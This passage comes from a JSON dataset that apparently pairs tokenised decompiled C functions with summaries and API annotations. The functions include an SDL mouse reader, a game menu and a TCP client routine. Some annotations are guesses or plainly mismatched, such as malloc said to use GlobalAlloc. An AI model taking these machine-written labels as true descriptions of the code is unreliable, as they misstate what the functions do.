            "The `_fprintf` function in the provided code snippets appears to be a custom implementation of the standard C `fprintf` function, used for formatted output to a file stream, with additional functionalities such as timestamp formatting, optional printing based on a boolean flag, and error handling for file stream flushing.",
            "The `srand` function is used to initialize the seed for generating pseudo-random numbers, ensuring that subsequent calls to the `rand` function produce different sequences of random numbers.",
            "The \"noecho\" function appears to be designed to modify terminal settings to disable echoing user input, enhancing security by preventing characters typed by the user from being displayed on the screen.",
            "The `wtimeout` function is used to set the blocking/non-blocking behavior of input functions on a specified ncurses window to have a timeout of 'delay' milliseconds.",
            "The function `init_displaymemset` likely initializes a display by setting a block of memory to a specified value, such as clearing a display buffer or setting a default state for a graphical display.",
            "The function `add_job` is used across various code snippets in different contexts, such as adding jobs to a list of tasks to do, initializing job-related data structures, and managing printer jobs, likely within a larger print management or job scheduling system.",
            "Based on the provided code snippets and the function name \"generate_apple\", it seems that this function is likely intended to repeatedly generate or process some form of apple-related data or objects, possibly in a loop, and then possibly run a scheduler or perform some cleanup task named \"delwin\"."
        ],
        "longer_label": "The provided C code initializes an ncurses window, sets up a game board, schedules tasks including updating the game state, handling user input, and generating apples for a snake-like game, while incorporating custom error handling and terminal settings modification for security."
    },
    {
        "id": 202,
        "docstring_tokens": [
            "The",
            "code",
            "reads",
            "mouse",
            "input",
            "and",
            "returns",
            "a",
            "value",
            "depending",
            "on",
            "the",
            "position",
            "of",
            "the",
            "mouse",
            "cursor",
            "within",
            "specified",
            "regions",
            "on",
            "the",
            "screen",
            ",",
            "with",
            "-1",
            "returned",
            "if",
            "no",
            "input",
            "is",
            "detected",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v0",
            ";",
            "__int64",
            "v1",
            ";",
            "_DWORD",
            "*",
            "v2",
            ";",
            "int",
            "result",
            ";",
            "char",
            "v4",
            "[",
            "248",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "v0",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v4",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v1",
            "=",
            "__asan_stack_malloc_2",
            "(",
            "224L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v1",
            ")",
            "v0",
            "=",
            "v1",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v0",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "8",
            ")",
            "=",
            "\"3 32 4 7 mouse_x 96 4 7 mouse_y 160 56 5 event \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "16",
            ")",
            "=",
            "MouseReader2",
            ";",
            "v2",
            "=",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            ";",
            "v2",
            "[",
            "536862720",
            "]",
            "=",
            "-",
            "235802127",
            ";",
            "v2",
            "[",
            "536862721",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v2",
            "[",
            "536862722",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v2",
            "[",
            "536862723",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v2",
            "[",
            "536862724",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v2",
            "[",
            "536862726",
            "]",
            "=",
            "-",
            "234881024",
            ";",
            "v5",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "SDL_PollEvent",
            "(",
            "v0",
            "+",
            "160",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "160",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "160",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "160",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "160",
            ")",
            "=",
            "=",
            "256",
            ")",
            "{",
            "result",
            "=",
            "0",
            ";",
            "goto",
            "LABEL_64",
            ";",
            "}",
            "if",
            "(",
            "!",
            "(",
            "unsigned",
            "int",
            ")",
            "SDL_GetMouseState",
            "(",
            "v0",
            "+",
            "32",
            ",",
            "v0",
            "+",
            "96",
            ")",
            ")",
            "goto",
            "LABEL_63",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            "599",
            "&",
            "&",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "32",
            ")",
            "<",
            "=",
            "720",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            "139",
            "&",
            "&",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "96",
            ")",
            "<",
            "=",
            "280",
            ")",
            "{",
            "result",
            "=",
            "1",
            ";",
            "goto",
            "LABEL_64",
            ";",
            "}",
            "}",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            "799",
            "&",
            "&",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "32",
            ")",
            "<",
            "=",
            "1020",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            "139",
            "&",
            "&",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "96",
            ")",
            "<",
            "=",
            "280",
            ")",
            "{",
            "result",
            "=",
            "2",
            ";",
            "goto",
            "LABEL_64",
            ";",
            "}",
            "}",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            "599",
            "&",
            "&",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "32",
            ")",
            "<",
            "=",
            "720",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            "329",
            "&",
            "&",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "96",
            ")",
            "<",
            "=",
            "470",
            ")",
            "{",
            "result",
            "=",
            "3",
            ";",
            "goto",
            "LABEL_64",
            ";",
            "}",
            "}",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            "799",
            "&",
            "&",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "32",
            ")",
            "<",
            "=",
            "1020",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            "329",
            "&",
            "&",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "96",
            ")",
            "<",
            "=",
            "470",
            ")",
            "{",
            "result",
            "=",
            "4",
            ";",
            "goto",
            "LABEL_64",
            ";",
            "}",
            "}",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            "599",
            "&",
            "&",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "32",
            ")",
            "<",
            "=",
            "720",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            "519",
            "&",
            "&",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "96",
            ")",
            "<",
            "=",
            "660",
            ")",
            "{",
            "result",
            "=",
            "5",
            ";",
            "goto",
            "LABEL_64",
            ";",
            "}",
            "}",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "32",
            ")",
            "<",
            "=",
            "799",
            "|",
            "|",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            "1020",
            ")",
            "goto",
            "LABEL_63",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            "519",
            "&",
            "&",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "96",
            ")",
            "<",
            "=",
            "660",
            ")",
            "result",
            "=",
            "6",
            ";",
            "else",
            "LABEL_63",
            ":",
            "result",
            "=",
            "-",
            "1",
            ";",
            "LABEL_64",
            ":",
            "if",
            "(",
            "v4",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v0",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8010",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8018",
            ")",
            "=",
            "0",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v0",
            "=",
            "1172321806L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8010",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8018",
            ")",
            "=",
            "-",
            "168430091",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"stack\" function likely implements a data structure or operation related to a stack, possibly managing memory allocations or handling function calls in a runtime environment, with variations in implementation such as managing a stack of nodes in a binary search tree or a stack for JavaScript function calls.",
            "The `malloc` function in the provided code snippets is a custom implementation of dynamic memory allocation, likely designed for a specific platform or environment, using `GlobalAlloc` to allocate memory with zero initialization."
        ],
        "longer_label": "The provided code is a function likely related to reading mouse events, implementing a custom memory allocation for stack management, and utilizing SDL library functions, with annotations describing potential functionalities of certain sections within the code."
    },
    {
        "id": 203,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "SDL",
            "window",
            ",",
            "loads",
            "font",
            "and",
            "image",
            ",",
            "displays",
            "menu",
            "and",
            "level",
            "selector",
            ",",
            "reads",
            "mouse",
            "input",
            ",",
            "and",
            "starts",
            "a",
            "game",
            "based",
            "on",
            "the",
            "selected",
            "event",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "__int64",
            "v4",
            ";",
            "_DWORD",
            "*",
            "v5",
            ";",
            "int",
            "event",
            ";",
            "int",
            "eventa",
            ";",
            "TTF_Font",
            "*",
            "Font",
            ";",
            "SDL_Renderer_0",
            "*",
            "rend",
            ";",
            "SDL_Texture_0",
            "*",
            "img",
            ";",
            "char",
            "v12",
            "[",
            "6360",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v13",
            ";",
            "v3",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v12",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "argc",
            "=",
            "6336L",
            "L",
            ";",
            "v4",
            "=",
            "__asan_stack_malloc_7",
            "(",
            "6336L",
            "L",
            ",",
            "argv",
            ")",
            ";",
            "if",
            "(",
            "v4",
            ")",
            "v3",
            "=",
            "v4",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v3",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "8",
            ")",
            "=",
            "\"2 32 3112 1 g 3200 3112 1 g \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "16",
            ")",
            "=",
            "main",
            ";",
            "v5",
            "=",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            ";",
            "v5",
            "[",
            "536862720",
            "]",
            "=",
            "-",
            "235802127",
            ";",
            "v5",
            "[",
            "536862818",
            "]",
            "=",
            "-",
            "218959360",
            ";",
            "v5",
            "[",
            "536862819",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v5",
            "[",
            "536862917",
            "]",
            "=",
            "-",
            "218959360",
            ";",
            "v13",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "TTF_Init",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "argc",
            ",",
            "argv",
            ",",
            "envp",
            ")",
            ";",
            "Font",
            "=",
            "(",
            "TTF_Font",
            "*",
            ")",
            "TTF_OpenFont",
            "(",
            "\"res/OpenSans-Regular.ttf\"",
            ",",
            "256L",
            "L",
            ")",
            ";",
            "rend",
            "=",
            "display",
            "(",
            "0L",
            "L",
            ")",
            ";",
            "event",
            "=",
            "-",
            "1",
            ";",
            "img",
            "=",
            "(",
            "SDL_Texture_0",
            "*",
            ")",
            "IMG_LoadTexture",
            "(",
            "rend",
            ",",
            "\"res/logo.png\"",
            ")",
            ";",
            "while",
            "(",
            "event",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "SDL_RenderClear",
            "(",
            "rend",
            ")",
            ";",
            "drawMenu",
            "(",
            "rend",
            ",",
            "Font",
            ",",
            "img",
            ")",
            ";",
            "event",
            "=",
            "MouseReader1",
            "(",
            ")",
            ";",
            "SDL_RenderPresent",
            "(",
            "rend",
            ")",
            ";",
            "SDL_Delay",
            "(",
            "16L",
            "L",
            ")",
            ";",
            "}",
            "if",
            "(",
            "event",
            "=",
            "=",
            "1",
            ")",
            "start",
            "(",
            "(",
            "game_0",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ",",
            "rend",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "event",
            "=",
            "=",
            "2",
            ")",
            "{",
            "eventa",
            "=",
            "-",
            "1",
            ";",
            "SDL_Delay",
            "(",
            "50L",
            "L",
            ")",
            ";",
            "while",
            "(",
            "eventa",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "SDL_RenderClear",
            "(",
            "rend",
            ")",
            ";",
            "drawLevelSelector",
            "(",
            "rend",
            ",",
            "Font",
            ",",
            "img",
            ")",
            ";",
            "eventa",
            "=",
            "MouseReader2",
            "(",
            ")",
            ";",
            "SDL_RenderPresent",
            "(",
            "rend",
            ")",
            ";",
            "}",
            "if",
            "(",
            "eventa",
            ")",
            "{",
            "__asan_unpoison_stack_memory",
            "(",
            "v3",
            "+",
            "3200",
            ",",
            "3112L",
            "L",
            ")",
            ";",
            "start",
            "(",
            "(",
            "game_0",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "3200",
            ")",
            ",",
            "rend",
            ",",
            "eventa",
            ")",
            ";",
            "}",
            "}",
            "SDL_DestroyTexture",
            "(",
            "img",
            ")",
            ";",
            "Mix_Quit",
            "(",
            ")",
            ";",
            "SDL_DestroyRenderer",
            "(",
            "rend",
            ")",
            ";",
            "SDL_DestroyWindow",
            "(",
            "0L",
            "L",
            ")",
            ";",
            "SDL_Quit",
            "(",
            ")",
            ";",
            "if",
            "(",
            "v12",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v3",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8310",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "(",
            "v5",
            "+",
            "536862722",
            ")",
            "&",
            "0xFFFFFFFFFFFFFFF8L",
            "L",
            ")",
            ",",
            "0",
            ",",
            "8L",
            "L",
            "*",
            "(",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v5",
            "+",
            "2147450880",
            "-",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v5",
            "+",
            "2147450888",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            "+",
            "792",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            ">",
            ">",
            "3",
            ")",
            ")",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v3",
            "=",
            "1172321806L",
            "L",
            ";",
            "__asan_stack_free_7",
            "(",
            "v3",
            ",",
            "6336L",
            "L",
            ",",
            "v12",
            ")",
            ";",
            "}",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"stack\" function likely serves to implement various stack data structures, possibly for managing memory, executing JavaScript functions, or organizing binary search trees, depending on the context provided by the code snippets.",
            "The provided code snippets suggest the function `malloc` is being redefined to allocate memory using `GlobalAlloc`, possibly as part of a larger project involving implementations of various algorithms and data structures in C."
        ],
        "longer_label": "The code appears to be a C program utilizing SDL and TTF libraries to create a graphical menu and level selector interface, with memory allocation possibly modified for specific use cases, and stack management for event handling and game execution."
    },
    {
        "id": 204,
        "docstring_tokens": [
            "The",
            "code",
            "establishes",
            "a",
            "TCP",
            "connection",
            "to",
            "a",
            "remote",
            "server",
            "at",
            "IP",
            "address",
            "``",
            "35.246.6.171",
            "''",
            "on",
            "port",
            "5000",
            ",",
            "reads",
            "data",
            "from",
            "the",
            "server",
            ",",
            "and",
            "appends",
            "it",
            "to",
            "a",
            "character",
            "array",
            "named",
            "``",
            "response",
            "''",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "response",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v1",
            ";",
            "__int64",
            "v2",
            ";",
            "_DWORD",
            "*",
            "v3",
            ";",
            "uint16_t",
            "v4",
            ";",
            "in_addr_t",
            "v5",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "char",
            "v7",
            ";",
            "int",
            "sockfd",
            ";",
            "int",
            "n",
            ";",
            "char",
            "v10",
            "[",
            "1176",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v11",
            ";",
            "v1",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v10",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v2",
            "=",
            "__asan_stack_malloc_5",
            "(",
            "1152L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v2",
            ")",
            "v1",
            "=",
            "v2",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v1",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "8",
            ")",
            "=",
            "\"2 32 16 9 serv_addr 96 1024 8 recvBuff \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "16",
            ")",
            "=",
            "getResp",
            ";",
            "v3",
            "=",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            ";",
            "v3",
            "[",
            "536862720",
            "]",
            "=",
            "-",
            "235802127",
            ";",
            "v3",
            "[",
            "536862721",
            "]",
            "=",
            "-",
            "219021312",
            ";",
            "v3",
            "[",
            "536862722",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v3",
            "[",
            "536862755",
            "]",
            "=",
            "-",
            "202116109",
            ";",
            "v11",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "96",
            ")",
            ",",
            "48",
            ",",
            "0x400uL",
            "L",
            ")",
            ";",
            "sockfd",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "1",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
